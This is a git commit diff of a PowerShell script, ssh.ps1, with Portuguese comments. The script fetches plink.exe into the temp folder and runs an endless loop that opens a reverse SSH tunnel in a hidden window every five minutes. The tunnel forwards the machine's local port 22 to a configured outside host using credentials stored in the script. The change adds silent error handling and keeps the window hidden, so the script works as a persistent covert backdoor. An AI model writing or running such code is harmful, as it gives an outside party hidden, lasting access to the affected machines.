a4c9f90bce0405ac616cfd3ab50a76bba8413ee2
usermants <sanchezguy@proton.me>
2025-08-21 15:43:24 -0300

    Update ssh.ps1

--- ssh.ps1
+++ ssh.ps1
@@ -10,19 +10,25 @@ $Config = @{
 
 $PlinkPath = "$env:TEMP\plink.exe"
 
+# Baixa Plink.exe se não existir
 function Ensure-Plink {
     if (!(Test-Path $PlinkPath)) {
         $plinkUrl = "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"
-        Invoke-WebRequest -Uri $plinkUrl -OutFile $PlinkPath -UseBasicParsing
+        try {
+            Invoke-WebRequest -Uri $plinkUrl -OutFile $PlinkPath -UseBasicParsing
+        } catch {
+            exit
+        }
     }
 }
 
+# Loop infinito de reconexão
 function Start-ReverseSSH {
     while ($true) {
         try {
             Ensure-Plink
             $cmd = "`"$PlinkPath`" -ssh $($Config.User)@$($Config.Host) -P $($Config.Port) -pw $($Config.Pass) -R $($Config.RemotePort):localhost:22 -N"
-            Start-Process -NoNewWindow -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c $cmd"
+            Start-Process -FilePath "cmd.exe" -ArgumentList "/c $cmd" -WindowStyle Hidden
         } catch {}
         Start-Sleep -Seconds 300
     }
